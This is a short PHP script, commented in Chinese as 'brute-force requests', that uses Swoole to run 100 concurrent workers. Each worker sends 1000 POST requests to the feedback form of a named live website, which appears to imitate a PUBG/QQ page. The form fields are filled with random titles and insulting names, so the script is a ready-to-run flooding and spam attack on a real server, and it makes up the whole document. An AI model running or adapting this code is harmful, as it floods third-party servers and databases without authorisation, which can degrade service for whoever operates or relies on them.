<?php
/**
 * 暴力请求
 */
require_once __DIR__ . "/../vendor/autoload.php";

use Monolog\Logger; 
use Monolog\Handler\StreamHandler;
use Llseng\Tool\Many\SwooleMany;
use Llseng\Tool\Http\FileReq;
 
// 创建日志频道 
$log = new Logger(__FILE__); 
$log->pushHandler(new StreamHandler(__DIR__ . '/../logs/'.date('Ymd').'.log', Logger::DEBUG));

//并发数
$cnum = 100;
//并发类
$many = new SwooleMany($cnum);

$many->go(function ($ser)use($log){
	$req = new FileReq("http://www.steampcwerd.oeiu.top/e/enews/index.php");
	$num = 1000;
	$succNum = 0;
	$req->setMethod("post");
	while ($num) {
		$req->setQuery([
			"enews"=>"AddFeedback",
			"bid"=>"1",
			"hyip"=>"",
			"ecmsfrom"=>"http://pubg.qq.com/cp/a20171127apply/index0110.shtml?baidu.coml",
			"bianhao"=>"1",
			"title"=>"250". rand(100000,9999999),
			"name"=>"sbsbsbsbsbsb250",
		]);
		try{
			$res = $req->exec();
			$succNum++;
		}catch(\Exception $e) {
			$log->addError("req err", (array)$e);
		}
		$num--;
	}
	return $succNum;
});

$many->to(function ($ser, $list)use($log){
	$log->addInfo("TO", $list);
});

$many->run();